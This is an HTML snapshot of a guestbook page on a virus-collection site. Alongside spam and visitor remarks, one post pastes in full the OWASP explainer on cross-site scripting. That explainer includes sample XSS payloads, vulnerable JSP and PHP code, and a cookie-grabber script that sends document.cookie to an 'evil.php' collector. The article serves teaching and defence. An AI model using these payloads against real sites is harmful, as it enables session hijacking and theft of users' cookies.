<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>Guestbook (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content=""/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"9b4b95982b99b82e4ff6058ae554e7c6e7540b11-1498758065-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><style type="text/css">#recaptcha_image{width:300px;height:57px;float:left;border:solid 1px #bbbaaa;}.re_buttons{width:20px;height:57px;float:left;margin-top:5px;margin-left:5px;}#recaptcha_widget a{text-decoration:none;color:#333111;font-size:10pt;}#recaptcha_widget img{border:none;}</style>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/guestbook.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option selected="selected" value="ru">Русский</option><option value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">В закладки</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Поиск"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Библиотека</a> <a href="/vl.php">Коллекция</a> <a href="/src.php">Исходники</a> <a href="/vx.php?id=eidx">Движки</a> <a href="/vx.php?id=tidx">Конструкторы</a> <a href="/vx.php?id=sidx">Симуляторы</a> <a href="/vx.php?id=uidx">Утилиты</a> <a href="/links.php">Ссылки</a> <a href="/donate.php" style="color: #706020" id="donate">Пожертвовать</a> <a href="/forum" style="text-decoration: underline;">Форум</a> </span><br clear="all"/>
</div>
<div class="s2">[ Предыдущая ][ <a href="guestbook.php?from=20">Следующая</a> ][ <a href="/guestbook.php?action=edit">Написать</a> ]&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Записи 0-19 (1079)<div class="l1"><strong><a href="/cdn-cgi/l/email-protection#0a796f7e62686565736f784a6d676b636624696567274445595a4b47">Yeniaul</a></strong> on 2016-11-25 at 21:13:39 </div><br/>It's even infected the Guestbook...<div class="l1"><strong><a href="/cdn-cgi/l/email-protection#36455b5f425e510f030776515b575f5a1855595b1b78796566777b">Smithg496</a></strong> on 2016-10-13 at 00:53:29 </div><br/>Nice read, I just passed this onto a friend who was doing some research<br/>
on that. And he actually bought me lunch as I found it for him smile<br/>
Thus let me rephrase that Thanks for lunch! adbdkkbaddegadae<div class="l1"><strong><a href="/cdn-cgi/l/email-protection#6d1e000419050f555a5a2d0a000c0401430e02004023223e3d2c20">Smithb406</a></strong> on 2016-09-16 at 21:32:48 </div><br/>I was very pleased to discover this website. I wanted to thank you for<br/>
your time for this fantastic read!! cfedakbkaedcekda<div class="l1"><strong><a href="/cdn-cgi/l/email-protection#3172435e42421c4258455411625243584145585f561119696262181111111111111c7f7e6261707c">Cross-site Scripting (XSS) </a></strong> on 2016-07-05 at 19:57:09 </div><br/>Cross-site Scripting (XSS)<br/>
<br/>
This is an Attack. To view all attacks, please see the Attack<br/>
Category page. <br/>
<br/>
<br/>
Last revision (mm/dd/yy): 06/4/2016<br/>
Overview<br/>
<br/>
Cross-Site Scripting (XSS) attacks are a type of injection, in which<br/>
malicious scripts are injected into otherwise benign and trusted web<br/>
sites. XSS attacks occur when an attacker uses a web application to send<br/>
malicious code, generally in the form of a browser side script, to a<br/>
different end user. Flaws that allow these attacks to succeed are quite<br/>
widespread and occur anywhere a web application uses input from a user<br/>
within the output it generates without validating or encoding it.<br/>
<br/>
An attacker can use XSS to send a malicious script to an unsuspecting<br/>
user. The end user’s browser has no way to know that the script should<br/>
not be trusted, and will execute the script. Because it thinks the<br/>
script came from a trusted source, the malicious script can access any<br/>
cookies, session tokens, or other sensitive information retained by the<br/>
browser and used with that site. These scripts can even rewrite the<br/>
content of the HTML page. For more details on the different types of XSS<br/>
flaws, see: Types of Cross-Site Scripting.<br/>
Related Security Activities<br/>
How to Avoid Cross-site scripting Vulnerabilities<br/>
<br/>
See the XSS (Cross Site Scripting) Prevention Cheat Sheet<br/>
<br/>
See the DOM based XSS Prevention Cheat Sheet<br/>
<br/>
See the OWASP Development Guide article on Phishing.<br/>
<br/>
See the OWASP Development Guide article on Data Validation.<br/>
How to Review Code for Cross-site scripting Vulnerabilities<br/>
<br/>
See the OWASP Code Review Guide article on Reviewing Code for Cross-site<br/>
scripting Vulnerabilities.<br/>
How to Test for Cross-site scripting Vulnerabilities<br/>
<br/>
See the latest OWASP Testing Guide article on how to test for the<br/>
various kinds of XSS vulnerabilities.<br/>
<br/>
Testing_for_Reflected_Cross_site_scripting_(OWASP-DV-001)<br/>
Testing_for_Stored_Cross_site_scripting_(OWASP-DV-002)<br/>
Testing_for_DOM-based_Cross_site_scripting_(OWASP-DV-003)<br/>
<br/>
Description<br/>
<br/>
Cross-Site Scripting (XSS) attacks occur when:<br/>
<br/>
Data enters a Web application through an untrusted source, most<br/>
frequently a web request.<br/>
The data is included in dynamic content that is sent to a web user<br/>
without being validated for malicious content.<br/>
<br/>
The malicious content sent to the web browser often takes the form of a<br/>
segment of JavaScript, but may also include HTML, Flash, or any other<br/>
type of code that the browser may execute. The variety of attacks based<br/>
on XSS is almost limitless, but they commonly include transmitting<br/>
private data, like cookies or other session information, to the<br/>
attacker, redirecting the victim to web content controlled by the<br/>
attacker, or performing other malicious operations on the user's machine<br/>
under the guise of the vulnerable site.<br/>
Stored and Reflected XSS Attacks<br/>
<br/>
XSS attacks can generally be categorized into two categories: stored and<br/>
reflected. There is a third, much less well known type of XSS attack<br/>
called DOM Based XSS that is discussed seperately here.<br/>
Stored XSS Attacks<br/>
<br/>
Stored attacks are those where the injected script is permanently stored<br/>
on the target servers, such as in a database, in a message forum,<br/>
visitor log, comment field, etc. The victim then retrieves the malicious<br/>
script from the server when it requests the stored information. Stored<br/>
XSS is also sometimes referred to as Persistent or Type-I XSS.<br/>
Reflected XSS Attacks<br/>
<br/>
Reflected attacks are those where the injected script is reflected off<br/>
the web server, such as in an error message, search result, or any other<br/>
response that includes some or all of the input sent to the server as<br/>
part of the request. Reflected attacks are delivered to victims via<br/>
another route, such as in an e-mail message, or on some other web site.<br/>
When a user is tricked into clicking on a malicious link, submitting a<br/>
specially crafted form, or even just browsing to a malicious site, the<br/>
injected code travels to the vulnerable web site, which reflects the<br/>
attack back to the user’s browser. The browser then executes the code<br/>
because it came from a &quot;trusted&quot; server. Reflected XSS is also<br/>
sometimes referred to as Non-Persistent or Type-II XSS.<br/>
Other Types of XSS Vulnerabilities<br/>
<br/>
In addition to Stored and Reflected XSS, another type of XSS, DOM Based<br/>
XSS was identified by Amit Klein in 2005. OWASP recommends the XSS<br/>
categorization as described in the OWASP Article: Types of Cross-Site<br/>
Scripting, which covers all these XSS terms, organizing them into a<br/>
matrix of Stored vs. Reflected XSS and Server vs. Client XSS, where DOM<br/>
Based XSS is a subset of Client XSS.<br/>
XSS Attack Consequences<br/>
<br/>
The consequence of an XSS attack is the same regardless of whether it is<br/>
stored or reflected (or DOM Based). The difference is in how the payload<br/>
arrives at the server. Do not be fooled into thinking that a “read<br/>
only” or “brochureware” site is not vulnerable to serious<br/>
reflected XSS attacks. XSS can cause a variety of problems for the end<br/>
user that range in severity from an annoyance to complete account<br/>
compromise. The most severe XSS attacks involve disclosure of the<br/>
user’s session cookie, allowing an attacker to hijack the user’s<br/>
session and take over the account. Other damaging attacks include the<br/>
disclosure of end user files, installation of Trojan horse programs,<br/>
redirect the user to some other page or site, or modify presentation of<br/>
content. An XSS vulnerability allowing an attacker to modify a press<br/>
release or news item could affect a company’s stock price or lessen<br/>
consumer confidence. An XSS vulnerability on a pharmaceutical site could<br/>
allow an attacker to modify dosage information resulting in an overdose.<br/>
For more information on these types of attacks see Content_Spoofing.<br/>
How to Determine If You Are Vulnerable<br/>
<br/>
XSS flaws can be difficult to identify and remove from a web<br/>
application. The best way to find flaws is to perform a security review<br/>
of the code and search for all places where input from an HTTP request<br/>
could possibly make its way into the HTML output. Note that a variety of<br/>
different HTML tags can be used to transmit a malicious JavaScript.<br/>
Nessus, Nikto, and some other available tools can help scan a website<br/>
for these flaws, but can only scratch the surface. If one part of a<br/>
website is vulnerable, there is a high likelihood that there are other<br/>
problems as well.<br/>
How to Protect Yourself<br/>
<br/>
The primary defenses against XSS are described in the OWASP XSS<br/>
Prevention Cheat Sheet.<br/>
<br/>
Also, it's crucial that you turn off HTTP TRACE support on all<br/>
webservers. An attacker can steal cookie data via Javascript even when<br/>
document.cookie is disabled or not supported on the client. This attack<br/>
is mounted when a user posts a malicious script to a forum so when<br/>
another user clicks the link, an asynchronous HTTP Trace call is<br/>
triggered which collects the user's cookie information from the server,<br/>
and then sends it over to another malicious server that collects the<br/>
cookie information so the attacker can mount a session hijack attack.<br/>
This is easily mitigated by removing support for HTTP TRACE on all<br/>
webservers.<br/>
<br/>
The OWASP ESAPI project has produced a set of reusable security<br/>
components in several languages, including validation and escaping<br/>
routines to prevent parameter tampering and the injection of XSS<br/>
attacks. In addition, the OWASP WebGoat Project training application has<br/>
lessons on Cross-Site Scripting and data encoding.<br/>
Alternate XSS Syntax<br/>
XSS using Script in Attributes<br/>
<br/>
XSS attacks may be conducted without using &lt;script&gt;&lt;/script&gt;<br/>
tags. Other tags will do exactly the same thing, for example:<br/>
<br/>
&lt;body onload=alert('test1')&gt;<br/>
<br/>
or other attributes like: onmouseover, onerror.<br/>
<br/>
onmouseover<br/>
<br/>
&lt;b onmouseover=alert('Wufff!')&gt;click me!&lt;/b&gt;<br/>
<br/>
onerror<br/>
<br/>
&lt;img src=&quot;<noindex><a rel="nofollow" href="http://url.to.file.which/not.exist&quot">http://url.to.file.which/not.exist&quot</a></noindex>;<br/>
onerror=alert(document.cookie);&gt;<br/>
<br/>
XSS using Script Via Encoded URI Schemes<br/>
<br/>
If we need to hide against web application filters we may try to encode<br/>
string characters, e.g.: a=&amp;#X41 (UTF-8) and use it in IMG tag:<br/>
<br/>
&lt;IMG SRC=j&amp;#X41vascript:alert('test2')&gt;<br/>
<br/>
There are many different UTF-8 encoding notations what give us even more<br/>
possibilities.<br/>
XSS using code encoding<br/>
<br/>
We may encode our script in base64 and place it in META tag. This way we<br/>
get rid of alert() totally. More information about this method can be<br/>
found in RFC 2397<br/>
<br/>
&lt;META HTTP-EQUIV=&quot;refresh&quot;<br/>
CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKT<br/>
wvc2NyaXB0Pg&quot;&gt;<br/>
<br/>
These and others examples can be found at the OWASP XSS Filter Evasion<br/>
Cheat Sheet which is a true encyclopedia of the alternate XSS syntax<br/>
attack.<br/>
<br/>
<br/>
Examples<br/>
<br/>
Cross-site scripting attacks may occur anywhere that possibly malicious<br/>
users are allowed to post unregulated material to a trusted web site for<br/>
the consumption of other valid users.<br/>
<br/>
The most common example can be found in bulletin-board web sites which<br/>
provide web based mailing list-style functionality.<br/>
Example 1<br/>
<br/>
The following JSP code segment reads an employee ID, eid, from an HTTP<br/>
request and displays it to the user.<br/>
<br/>
&lt;% String eid = request.getParameter(&quot;eid&quot;); %&gt; <br/>
...<br/>
Employee ID: &lt;%= eid %&gt;<br/>
<br/>
The code in this example operates correctly if eid contains only<br/>
standard alphanumeric text. If eid has a value that includes<br/>
meta-characters or source code, then the code will be executed by the<br/>
web browser as it displays the HTTP response.<br/>
<br/>
Initially this might not appear to be much of a vulnerability. After<br/>
all, why would someone enter a URL that causes malicious code to run on<br/>
their own computer? The real danger is that an attacker will create the<br/>
malicious URL, then use e-mail or social engineering tricks to lure<br/>
victims into visiting a link to the URL. When victims click the link,<br/>
they unwittingly reflect the malicious content through the vulnerable<br/>
web application back to their own computers. This mechanism of<br/>
exploiting vulnerable web applications is known as Reflected XSS.<br/>
Example 2<br/>
<br/>
The following JSP code segment queries a database for an employee with a<br/>
given ID and prints the corresponding employee's name.<br/>
<br/>
<br/>
&lt;%... <br/>
Statement stmt = conn.createStatement();<br/>
ResultSet rs = stmt.executeQuery(&quot;select * from emp where<br/>
id=&quot;+eid);<br/>
if (rs != null) {<br/>
rs.next(); <br/>
String name = rs.getString(&quot;name&quot;);<br/>
%&gt;<br/>
<br/>
Employee Name: &lt;%= name %&gt;<br/>
<br/>
As in Example 1, this code functions correctly when the values of name<br/>
are well-behaved, but it does nothing to prevent exploits if they are<br/>
not. Again, this code can appear less dangerous because the value of<br/>
name is read from a database, whose contents are apparently managed by<br/>
the application. However, if the value of name originates from<br/>
user-supplied data, then the database can be a conduit for malicious<br/>
content. Without proper input validation on all data stored in the<br/>
database, an attacker can execute malicious commands in the user's web<br/>
browser. This type of exploit, known as Stored XSS, is particularly<br/>
insidious because the indirection caused by the data store makes it more<br/>
difficult to identify the threat and increases the possibility that the<br/>
attack will affect multiple users. XSS got its start in this form with<br/>
web sites that offered a &quot;guestbook&quot; to visitors. Attackers<br/>
would include JavaScript in their guestbook entries, and all subsequent<br/>
visitors to the guestbook page would execute the malicious code.<br/>
<br/>
As the examples demonstrate, XSS vulnerabilities are caused by code that<br/>
includes unvalidated data in an HTTP response. There are three vectors<br/>
by which an XSS attack can reach a victim:<br/>
<br/>
As in Example 1, data is read directly from the HTTP request and<br/>
reflected back in the HTTP response. Reflected XSS exploits occur when<br/>
an attacker causes a user to supply dangerous content to a vulnerable<br/>
web application, which is then reflected back to the user and executed<br/>
by the web browser. The most common mechanism for delivering malicious<br/>
content is to include it as a parameter in a URL that is posted publicly<br/>
or e-mailed directly to victims. URLs constructed in this manner<br/>
constitute the core of many phishing schemes, whereby an attacker<br/>
convinces victims to visit a URL that refers to a vulnerable site. After<br/>
the site reflects the attacker's content back to the user, the content<br/>
is executed and proceeds to transfer private information, such as<br/>
cookies that may include session information, from the user's machine to<br/>
the attacker or perform other nefarious activities.<br/>
As in Example 2, the application stores dangerous data in a database<br/>
or other trusted data store. The dangerous data is subsequently read<br/>
back into the application and included in dynamic content. Stored XSS<br/>
exploits occur when an attacker injects dangerous content into a data<br/>
store that is later read and included in dynamic content. From an<br/>
attacker's perspective, the optimal place to inject malicious content is<br/>
in an area that is displayed to either many users or particularly<br/>
interesting users. Interesting users typically have elevated privileges<br/>
in the application or interact with sensitive data that is valuable to<br/>
the attacker. If one of these users executes malicious content, the<br/>
attacker may be able to perform privileged operations on behalf of the<br/>
user or gain access to sensitive data belonging to the user.<br/>
A source outside the application stores dangerous data in a database<br/>
or other data store, and the dangerous data is subsequently read back<br/>
into the application as trusted data and included in dynamic content.<br/>
<br/>
Attack Examples<br/>
<br/>
Example 1 : Cookie Grabber<br/>
<br/>
If the application doesn't validate the input data, the attacker can<br/>
easily steal a cookie from an authenticated user. All the attacker has<br/>
to do is to place the following code in any posted input(ie: message<br/>
boards, private messages, user profiles):<br/>
<br/>
&lt;SCRIPT type=&quot;text/javascript&quot;&gt;<br/>
var adr = '../evil.php?cakemonster=' + escape(document.cookie);<br/>
&lt;/SCRIPT&gt;<br/>
<br/>
The above code will pass an escaped content of the cookie (according to<br/>
RFC content must be escaped before sending it via HTTP protocol with GET<br/>
method) to the evil.php script in &quot;cakemonster&quot; variable. The<br/>
attacker then checks the results of his evil.php script (a cookie<br/>
grabber script will usually write the cookie to a file) and use it.<br/>
Error Page Example<br/>
<br/>
Let's assume that we have an error page, which is handling requests for<br/>
a non existing pages, a classic 404 error page. We may use the code<br/>
below as an example to inform user about what specific page is missing:<br/>
<br/>
&lt;html&gt;<br/>
&lt;body&gt;<br/>
<br/>
&lt;? php<br/>
print &quot;Not found: &quot; .<br/>
urldecode($_SERVER[&quot;REQUEST_URI&quot;]);<br/>
?&gt;<br/>
<br/>
&lt;/body&gt;<br/>
&lt;/html&gt;<br/>
<br/>
Let's see how it works:<br/>
<br/>
<noindex><a rel="nofollow" href="http://testsite.test/file_which_not_exist">http://testsite.test/file_which_not_exist</a></noindex><br/>
<br/>
In response we get:<br/>
<br/>
Not found: /file_which_not_exist<br/>
<br/>
Now we will try to force the error page to include our code:<br/>
<br/>
<noindex><a rel="nofollow" href="http://testsite.test/&lt">http://testsite.test/&lt</a></noindex>;script&gt;alert(&quot;TEST&quot;);&lt;/script&g<br/>
t;<br/>
<br/>
The result is:<br/>
<br/>
Not found: / (but with JavaScript code<br/>
&lt;script&gt;alert(&quot;TEST&quot;);&lt;/script&gt;)<br/>
<br/>
We have successfully injected the code, our XSS! What does it mean? For<br/>
example, that we may use this flaw to try to steal a user's session<br/>
cookie.<br/>
<br/>
<br/>
Related Attacks<br/>
<br/>
XSS Attacks<br/>
Category:Injection Attack<br/>
Invoking untrusted mobile code<br/>
Cross Site History Manipulation (XSHM)<br/>
<br/>
Related Vulnerabilities<br/>
<br/>
Category:Input Validation Vulnerability<br/>
Cross Site Scripting Flaw<br/>
Types of Cross-Site Scripting<br/>
<br/>
Related Controls<br/>
<br/>
Category:Input Validation<br/>
HTML Entity Encoding<br/>
Output Validation<br/>
Canonicalization<br/>
<br/>
References<br/>
<br/>
OWASP's XSS (Cross Site Scripting) Prevention Cheat Sheet<br/>
OWASP Guide to Building Secure Web Applications and Web Services,<br/>
Chapter 8: Data Validation<br/>
OWASP Testing Guide,<br/>
Testing_for_Reflected_Cross_site_scripting_(OWASP-DV-001)<br/>
OWASP Testing Guide,<br/>
Testing_for_Stored_Cross_site_scripting_(OWASP-DV-002)<br/>
OWASP Testing Guide,<br/>
Testing_for_DOM-based_Cross_site_scripting_(OWASP-DV-003)<br/>
OWASP's How to Build an HTTP Request Validation Engine (J2EE<br/>
validation using OWASP's Stinger)<br/>
Google Code Best Practice Guide:<br/>
<noindex><a rel="nofollow" href="http://code.google.com/p/doctype/wiki/ArticlesXSS">http://code.google.com/p/doctype/wiki/ArticlesXSS</a></noindex><br/>
The Cross Site Scripting FAQ:<br/>
<noindex><a rel="nofollow" href="http://www.cgisecurity.com/articles/xss-faq.shtml">http://www.cgisecurity.com/articles/xss-faq.shtml</a></noindex><br/>
OWASP XSS Filter Evasion Cheat Sheet<br/>
CERT Advisory on Malicious HTML Tags:<br/>
<noindex><a rel="nofollow" href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a></noindex><br/>
CERT “Understanding Malicious Content Mitigation”<br/>
<noindex><a rel="nofollow" href="http://www.cert.org/tech_tips/malicious_code_mitigation.html">http://www.cert.org/tech_tips/malicious_code_mitigation.html</a></noindex><br/>
Understanding the cause and effect of CSS Vulnerabilities:<br/>
<noindex><a rel="nofollow" href="http://www.technicalinfo.net/papers/CSS.html">http://www.technicalinfo.net/papers/CSS.html</a></noindex><br/>
XSSed - Cross-Site Scripting (XSS) Information and Mirror Archive of<br/>
Vulnerable Websites <noindex><a rel="nofollow" href="http://www.xssed.com">http://www.xssed.com</a></noindex><br/>
<br/>
<br/>
Categories:<br/>
<br/>
OWASP ASDR Project<br/>
Security Focus Area<br/>
Injection<br/>
OWASP Top Ten Project<br/>
Code Snippet<br/>
Attack<br/>
Popular<br/>
<br/>
Navigation menu<br/>
<br/>
Log in<br/>
Request account<br/>
<br/>
Page<br/>
Discussion<br/>
<br/>
Read<br/>
View source<br/>
View history<br/>
<br/>
Home<br/>
About OWASP<br/>
Acknowledgements<br/>
Advertising<br/>
AppSec Events<br/>
Books<br/>
Brand Resources<br/>
Chapters<br/>
Donate to OWASP<br/>
Downloads<br/>
Funding<br/>
Governance<br/>
Initiatives<br/>
Mailing Lists<br/>
Membership<br/>
Merchandise<br/>
News<br/>
Community portal<br/>
Presentations<br/>
Press<br/>
Projects<br/>
Video<br/>
Volunteer<br/>
<br/>
Reference<br/>
<br/>
Activities<br/>
Attacks<br/>
Code Snippets<br/>
Controls<br/>
Glossary<br/>
How To...<br/>
Java Project<br/>
.NET Project<br/>
Principles<br/>
Technologies<br/>
Threat Agents<br/>
Vulnerabilities<br/>
<br/>
Language<br/>
Tools<br/>
<br/>
This page was last modified on 4 June 2016, at 08:18.<br/>
This page has been accessed 1,980,976 times.<br/>
Content is available under a Creative Commons 3.0 License unless<br/>
otherwise noted.<br/>
<br/>
Privacy policy<br/>
About OWASP<br/>
Disclaimers<br/>
<br/>
a Creative Commons 3.0 License<br/>
Powered by MediaWiki Powered by Rackspace Managed Cloud<div class="l1"><strong><a href="/cdn-cgi/l/email-protection#9bd1f3f4f3f5bbc8f3abecb6d5d4c8cbdad6">Jhordan</a></strong> on 2016-07-05 at 19:55:16 </div><br/>This looks like a type of me.<div class="l1"><strong><a href="/cdn-cgi/l/email-protection#d3b0bfb2a0bba1bcaab2bfbbb2b0b8b4b6bdb6a1b2a7bca193b4beb2babffdb0bcfe9d9c8083929e">clash royale astuce</a></strong> on 2016-07-04 at 23:43:15 </div><br/>I visited several web pages but this is great page..<div class="l1"><strong>Kalamare</strong> on 2016-03-15 at 10:48:16 </div><br/>a Specter say something ...<div class="l1"><strong><a href="/cdn-cgi/l/email-protection#4b22252d243f2e3924252722252e652824260b2c262a222765282426660504181b0a06">Infoteronline</a></strong> on 2016-03-03 at 19:51:26 </div><br/>Informasi Seputar Teknologi / Information About Technology<div class="l1"><strong>Володя</strong> on 2015-08-25 at 12:07:54 </div><br/>Хермит, можно ли актуальную версию<br/>
всего сайта каким-то образом стянуть?<br/>
Торрент? <div class="reply">Ves' net. Collection only. Esli nuzhno - mylom.</div><div class="l1"><strong>mozz</strong> on 2015-07-06 at 23:08:34 </div><br/>что за пробандеровская хуета написана<br/>
тут? <div class="reply">tebya zabyli sprosit' :-)</div><div class="l1"><strong><a href="/cdn-cgi/l/email-protection#3e4d4c5b5f535750597e59535f57525d1370716d6e7f73">streaming bola</a></strong> on 2015-05-09 at 09:23:15 </div><br/>thanks you, it's amazing..<div class="l1"><strong><a href="/cdn-cgi/l/email-protection#cfbca2a6bba7abfdfbfd8fa8a2aea6a3e1aca0a2e281809c9f8e82">Smithd648</a></strong> on 2015-04-28 at 13:21:53 </div><br/>Nice read, I just passed this onto a friend who was doing some research<br/>
on that. And he actually bought me lunch as I found it for him smile<br/>
Thus let me rephrase that Thanks for lunch! kfkbbbeedffeddkk<div class="l1"><strong><a href="/cdn-cgi/l/email-protection#18517b70587a7176367b77753556574b485955">Ich</a></strong> on 2014-10-01 at 07:05:13 </div><br/>Hi there.<br/>
Please, STOP AMERICAN AGGRESSION AGAINST THE WORLD.<br/>
Do not use CloudFlare. CloudFlare is system to perform<br/>
man-in-the-middle-attacks very easily. It intercepts all the web traffic<br/>
of your website. Your website is spied. It is controlled, monitored, by<br/>
americans even if your server is in Europe.<br/>
Where is the privacy for the users of your website?<br/>
Also note that CloudFlare doesn't work to hide the IP Address of your<br/>
website (that is 94.242.198.110)<br/>
I know that i could put the IP address of your server linked with its<br/>
domain vxheaven.org in my hosts file or in my local DNS Server bind9, so<br/>
that i could connect directly with your server without having CloudFlare<br/>
intercepting me, but that would work only for me. <br/>
Disable CloudFlare for everybody's benefit.<br/>
<br/>
Thank you.<div class="l1"><strong>Mac</strong> on 2014-07-16 at 18:30:17 </div><br/>Please keep this site up. I'm really interested in this stuff.<div class="l1"><strong>vxchaos</strong> on 2013-10-15 at 18:59:05 </div><br/>Phearless eZine from links in vx heaven is fake, people site is fake all<br/>
vx secrets from vx chat people from Phearless eZine give to serbian<br/>
department and police for security, and everything going in country of<br/>
this server . Do it something about this problem<div class="l1"><strong>ex oldschool</strong> on 2013-09-27 at 18:53:34 </div><br/>I think oldschool is better !!!<br/>
you new vxer why you want to represent vx heaven like locked elite ?<br/>
Give people rights to exchange undetected virus ... I think me and much<br/>
more people from old school think that , why you new vxer want first<br/>
virus to become detected , and then post uploaded here ? why u scare ?<br/>
Freedom of all vxer is broken :-(<div class="l1"><strong>Anonymous</strong> on 2013-09-24 at 12:33:54 </div><br/>Nice site. I wish there were more Win9x viruses.<div class="l1"><strong>NN</strong> on 2013-09-14 at 07:27:07 </div><br/>Вроде этот сайт закрывали. Расскажите<br/>
историю... Чем все закончилось?<div class="l1"><strong>Lux</strong> on 2013-07-07 at 03:33:17 </div><br/>this is better! <br/>
with VX HEAVEN now i can enjoy in life<div class="l1"><strong>Pirat</strong> on 2012-02-07 at 20:00:45 </div><br/>Как я понял, нужно запостить 5<br/>
сообщений, чтобы скачать торрент. Зачем<br/>
это? Да и по-английски я не очень<br/>
понимаю.<br/>[ Предыдущая ][ <a href="guestbook.php?from=20">Следующая</a> ][ <a href="/guestbook.php?action=edit">Написать</a> ]&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Записи 0-19 (1079)</div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/guestbook.php?lang=de">de</a><a href="/guestbook.php?lang=en">en</a><a href="/guestbook.php?lang=es">es</a><a href="/guestbook.php?lang=it">it</a><a href="/guestbook.php?lang=fr">fr</a><a href="/guestbook.php?lang=pl">pl</a><a href="/guestbook.php?lang=ru">ru</a><a href="/guestbook.php?lang=ua">ua</a></div>
<script>/* <![CDATA[ */(function(d,s,a,i,j,r,l,m,t){try{l=d.getElementsByTagName('a');t=d.createElement('textarea');for(i=0;l.length-i;i++){try{a=l[i].href;s=a.indexOf('/cdn-cgi/l/email-protection');m=a.length;if(a&&s>-1&&m>28){j=28+s;s='';if(j<m){r='0x'+a.substr(j,2)|0;for(j+=2;j<m&&a.charAt(j)!='X';j+=2)s+='%'+('0'+('0x'+a.substr(j,2)^r).toString(16)).slice(-2);j++;s=decodeURIComponent(s)+a.substr(j,m-j)}t.innerHTML=s.replace(/</g,'&lt;').replace(/\>/g,'&gt;');l[i].href='mailto:'+t.value}}catch(e){}}}catch(e){}})(document);/* ]]> */</script></body>
</html>
